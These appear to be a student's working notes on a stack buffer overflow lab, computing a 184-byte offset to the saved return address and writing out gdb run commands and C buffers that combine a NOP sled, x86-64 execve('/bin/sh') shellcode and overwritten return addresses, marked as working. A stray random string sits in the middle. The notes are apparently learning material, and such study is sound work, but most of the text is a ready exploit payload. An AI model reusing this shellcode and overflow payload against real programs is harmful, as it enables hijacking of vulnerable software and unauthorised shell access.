Addresses:
	Return Address (rip) = 0x7fffffffd9a8 -
	Base pointer (rbp)   = 0x7fffffffd9a0 -
	localBuf             = 0x7fffffffd8f0 -
	len                  = 0x7fffffffd99e -
	var1                 = 0x7fffffffd990 -
	ptr                  = 0x7fffffffd988 - 
	
	
Stack order:

	rip				Higher address
	rbp					|
	len					|
	var1				|	
	ptr					|		
	localBuf 		Lower address
	



Offset = return address - localBuf address
Offset = 0x7fffffffd9a8 - 0x7fffffffd8f0
Offset = 0xB8
	   = 184
	   
	After doing multiple tests with different strings, the offset is still 0xB8
	   
	   Offset number of bytes to enter 6-byte address of localBuf
	
	
	
	eaqJbziX6213vyhMkeaah5O0N0KmTceHqhbhlH2KzN4QvtZqE89Y9EWIrxwOcPgIXQFeKxuNYyeZtltZY4VF2y1Lm6GXf9m7nFzQ6sawqoKR4QhZ3Ck3cfP7bBHqUkxCC15WW3yzFFWVPC9Xx2dOJheaqJbziX6213vyhMkeaah5O0N0KmTceHqhbhlH2KzN4QvtZqE89Y9EWIrxwOcPgIXQFeKxuNYyeZtltZY4VF2y1Lm6GXf9m7nFzQ6sawqoKR4QhZ3Ck3cfP7bBHqUkxCC15WW3yzFFWVPC9Xx2dOJh


run $(python3 -c "print('\x90' * 157 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xa8\xeb\xff\xff\xff\xff' + '\x00')")
run $(python3 -c "print('\x90' * 100 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+ 'a' * 57 + '\x60\xd8\xff\xff\xff\xff' + '\x00')")
run $(python3 -c "print('\x90'*184 + '\xa8\xeb\xff\xff\xff\xff')")
run $(python3 -c "print('a'*184 + '\x24\x23\x22\x21\x11\x22')")

0x7fffffffebc0 <- somewhere in the middle of the nops


	
	
	
	
- WHILE WATCHING COMPUTERPHILE VIDEO - 

// Overwrites rip and rbp with \x41
run $(python3 -c "print('\x41' * 190)")

// Adding in the shell code and nops
	run $(python3 -c "print('\x90' * 103 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + '\x41\x41\x41\x41\x41\x41' * 10)")
							|-----------|	|------------------------------------------------------------------------------------------------------------|	|-----------|	
								nops 												shellcode														     padded return address
// Address to use using the following gdb command after running the above code: 
x/200bx $rsp -250


Address to use = 0x7fffffffd88e
			   = 0x 7f ff ff ff d8 8e


// New command with a proper return address
run $(python3 -c "print('\x90' * 103 + '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + '\x8e\xd8\xff\xff\xff\x7f' * 10)")

WORKS IN GDB on target object file

190 bytes for designed buffer = 184 + 6 bytes of address
184 = return address - local buff address

// without return address *10
char* buff = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

// with x41x41 return address * 10
// \x41\x41\x41\x41\x41\x41
char* buff = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";



// with proper return address *10
return_address = \x60\xeb\xff\xff\xff\x7f
char* buff = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f\x60\xeb\xff\xff\xff\x7f";


WORKS EVERYWHERE IN EXPLOITS


	
	
	
	
